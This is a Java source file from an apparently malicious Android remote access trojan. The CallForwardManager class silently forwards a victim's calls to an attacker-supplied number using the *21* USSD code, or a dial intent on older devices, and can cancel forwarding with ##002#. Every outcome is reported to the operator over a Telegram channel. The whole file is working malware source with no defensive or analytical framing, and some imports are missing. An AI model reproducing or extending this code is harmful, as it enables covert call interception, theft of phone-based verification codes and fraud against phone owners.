package com.enterprise.rat.commands;

import android.content.Context;
import android.telephony.TelephonyManager;
import com.enterprise.rat.utils.TelegramApi;
import java.lang.reflect.Method;

public class CallForwardManager {
    private Context context;

    public CallForwardManager(Context context) { this.context = context; }

    public void setForward(String number) {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                tm.sendUssdRequest("*21*" + number + "#", new TelephonyManager.UssdResponseCallback() {
                    @Override
                    public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                        TelegramApi.sendMessage("<b>📲 Call Forward Set:</b>\n" + response.toString());
                    }
                    @Override
                    public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                        TelegramApi.sendMessage("❌ Forward failed: code " + failureCode);
                    }
                }, new android.os.Handler(android.os.Looper.getMainLooper()));
            } else {
                // Fallback: direct dial
                Intent intent = new Intent(Intent.ACTION_CALL);
                intent.setData(Uri.parse("tel:" + "*21*" + number + Uri.encode("#")));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                TelegramApi.sendMessage("📲 Dialing forward code...");
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Forward error: " + e.getMessage());
        }
    }

    public void cancelForward() {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                tm.sendUssdRequest("##002#", new TelephonyManager.UssdResponseCallback() {
                    @Override
                    public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                        TelegramApi.sendMessage("<b>📲 Forward Cancelled:</b>\n" + response.toString());
                    }
                    @Override
                    public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                        TelegramApi.sendMessage("❌ Cancel failed.");
                    }
                }, new android.os.Handler(android.os.Looper.getMainLooper()));
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Cancel error: " + e.getMessage());
        }
    }
}
